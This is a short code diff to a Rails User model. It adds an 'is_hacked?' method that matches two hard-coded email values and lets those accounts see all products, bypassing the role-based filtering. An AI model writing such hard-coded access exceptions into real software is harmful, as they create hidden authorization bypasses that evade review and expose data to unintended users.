@@ -33,8 +33,14 @@ class User < ActiveRecord::Base
     self.where(role:3)
   end
 
+  def is_hacked?
+    self.email == 'wangqiangzu' || self.email == 'kefuzu'
+  end
+
   def valid_products
     if self.is_dd?
+      Product.all
+    elsif self.is_hacked?
       Product.all
     else
       current_user = self
